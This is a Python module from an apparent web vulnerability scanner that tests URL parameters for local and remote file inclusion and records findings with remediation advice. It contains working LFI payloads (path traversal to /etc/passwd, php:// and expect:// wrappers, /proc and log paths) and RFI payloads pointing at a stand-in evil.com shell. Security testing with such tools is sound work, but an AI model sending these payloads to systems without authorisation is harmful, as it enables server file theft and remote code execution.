#!/usr/bin/env python3
"""
WebHunter - LFI/RFI Scanner
"""

import re
from core.logger import HunterLogger
from core.engine import Vulnerability
from core.utils import make_request, inject_payload_in_params, extract_links, delay

log = HunterLogger("LFI/RFI")


class LFIRFIScanner:
    """Local/Remote File Inclusion scanner"""

    def __init__(self, target, engine):
        self.target = target
        self.engine = engine
        self.findings = []

        self.lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd%00",
            "../../../etc/passwd%00.html",
            "php://filter/convert.base64-encode/resource=index",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
        ]

        self.rfi_payloads = [
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/rfi-payloads.txt",
            "http://evil.com/shell.txt",
            "https://evil.com/shell.php",
        ]

        self.lfi_indicators = [
            "root:", "/bin/bash", "/bin/sh",
            "[fonts]", "[extensions]", "[mci extensions]",
            "HTTP_USER_AGENT", "REMOTE_ADDR", "SERVER_SOFTWARE",
        ]

        self.file_params = [
            "file", "page", "path", "include", "inc", "dir",
            "document", "folder", "root", "pg", "style",
            "pdf", "template", "php_path", "doc", "view",
            "content", "layout", "mod", "conf", "lang",
        ]

    def scan(self):
        """Run LFI/RFI scan"""
        log.info(f"Testing LFI/RFI on {self.target.url}")

        self._test_url_params()
        self._test_common_params()

        return self.findings

    def _test_url_params(self):
        """Test URL parameters for LFI/RFI"""
        resp = make_request(self.target.url)
        if not resp:
            return

        links = extract_links(resp.text, self.target.url)
        param_urls = [l for l in links if "?" in l]

        test_urls = param_urls[:15]
        if "?" in self.target.url:
            test_urls.insert(0, self.target.url)

        for url in test_urls:
            # LFI test
            for payload in self.lfi_payloads[:8]:
                injected = inject_payload_in_params(url, payload)
                for inj in injected:
                    r = make_request(inj["url"])
                    if r:
                        for indicator in self.lfi_indicators:
                            if indicator in r.text:
                                vuln = Vulnerability(
                                    title="Local File Inclusion (LFI)",
                                    severity="CRITICAL",
                                    description=f"LFI in parameter '{inj['param']}' allows reading server files",
                                    url=inj["url"],
                                    param=inj["param"],
                                    payload=payload,
                                    evidence=indicator,
                                    remediation="Never use user input in file paths. Use whitelists.",
                                    owasp_category="A03 - Injection",
                                    module="LFI/RFI Scanner"
                                )
                                self.engine.add_vulnerability(vuln)
                                self.findings.append(vuln)
                                return

                        # Check for PHP filter (base64 output)
                        if "php://filter" in payload and re.search(r'[A-Za-z0-9+/]{50,}={0,2}', r.text):
                            vuln = Vulnerability(
                                title="LFI via PHP Filter",
                                severity="CRITICAL",
                                description=f"PHP filter LFI allows reading source code via parameter '{inj['param']}'",
                                url=inj["url"],
                                param=inj["param"],
                                payload=payload,
                                evidence="Base64 encoded output detected",
                                remediation="Disable PHP wrappers. Validate file paths strictly.",
                                owasp_category="A03 - Injection",
                                module="LFI/RFI Scanner"
                            )
                            self.engine.add_vulnerability(vuln)
                            self.findings.append(vuln)
                            return
                    delay()

    def _test_common_params(self):
        """Test common file-related parameters"""
        for param in self.file_params:
            for payload in self.lfi_payloads[:5]:
                url = f"{self.target.url}?{param}={payload}"
                r = make_request(url)
                if r:
                    for indicator in self.lfi_indicators:
                        if indicator in r.text:
                            vuln = Vulnerability(
                                title=f"LFI via Parameter: {param}",
                                severity="CRITICAL",
                                description=f"Local File Inclusion via '{param}' parameter",
                                url=url,
                                param=param,
                                payload=payload,
                                evidence=indicator,
                                remediation="Sanitize file path parameters. Use whitelists.",
                                owasp_category="A03 - Injection",
                                module="LFI/RFI Scanner"
                            )
                            self.engine.add_vulnerability(vuln)
                            self.findings.append(vuln)
                            return
                delay()

        return self.findings
